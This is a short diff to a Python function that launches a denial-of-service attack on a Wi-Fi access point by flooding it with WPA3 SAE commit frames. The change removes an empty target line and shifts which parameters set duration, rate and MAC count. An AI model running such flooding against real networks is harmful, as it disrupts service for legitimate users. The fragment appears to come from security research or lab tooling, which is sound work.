@@ -110,7 +110,6 @@ def start_dos(params):
     
     print("which mac do you want to target (leave empty for default AP MAC): ")
     # target = input("MAC: ")
-    target = ""
     ap_mac = utils.get_mac("TrustedAP")[0]
 
     threading.Thread(target=_track_cookie,daemon=True).start()
@@ -119,7 +118,7 @@ def start_dos(params):
     sys.setswitchinterval(0.0005)
     stop_track.clear()
 
-    duration, rate, mac_no = flood_sae_commits(ap_mac=ap_mac, duration=int(params[0]), rate=float(params[1]), mac_no=int(params[2]))
+    duration, rate, mac_no = flood_sae_commits(ap_mac=ap_mac, duration=int(params[1]), rate=float(params[2]), mac_no=int(params[3]))
 
     sys.setswitchinterval(og_interval)
     #stop threading
